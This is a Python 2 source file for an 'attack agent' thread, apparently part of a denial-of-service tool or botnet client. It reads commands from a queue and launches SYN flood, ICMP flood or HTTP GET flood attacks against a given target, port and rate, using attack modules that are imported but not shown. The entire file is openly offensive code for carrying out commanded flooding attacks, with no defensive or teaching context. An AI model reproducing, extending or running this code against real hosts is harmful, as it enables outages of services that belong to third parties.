# Attack agent thread. This performs the attack based on instructions from the main thread.

import time, threading, Queue
import attacks.syn2
import attacks.icmpflood
import attacks.httpflood


class Attacker(threading.Thread):
    def __init__(self, Q):
        threading.Thread.__init__(self) # Required for thread class
        self.instruction_q = Q

    def run(self):
        while 1:
            self.poll_queue()


    def poll_queue(self):
        try:
            self.instruction = self.instruction_q.get(True, 0.05)

            self.attack_handler(self.instruction)
            #time.sleep(1)
        except Queue.Empty:
            pass

    def attack_handler(self, ins):
        #print "Attack type: ", ins
        id = ins['id']
        if ins[id]['attack'] == 'SYNFLOOD':
            print "Performing SYN FLOOD at rate: ", ins[id]['rate']
            Att =  attacks.syn2.SYNFLOOD(self.instruction_q, ins[id]['target'], ins[id]['port'], ins[id]['rate'])
            Att.main()

        elif ins[id]['attack'] == 'ICMPFLOOD':
            print "Performing ICMP flood at rate: ", ins[id]['rate']
            Att = attacks.icmpflood.ICMP_FLOOD(self.instruction_q, ins[id]['target'], ins[id]['port'], ins[id]['rate'], ins[id]['pktsize'])
            Att.main()

        elif ins[id]['attack'] == 'HTTPFLOOD':
            print "Performing HTTP GET Flood"
            Att = attacks.httpflood.http_main(self.instruction_q, ins[id]['target'], ins[id]['port'], ins[id]['rate'], ins[id]['get'], ins[id]['processes'], ins[id]['connections'])
            Att.main()

        elif ins[id]['attack'] == 'ABC':
            print "ABC attack"
        else:
            print "Unknown attack"

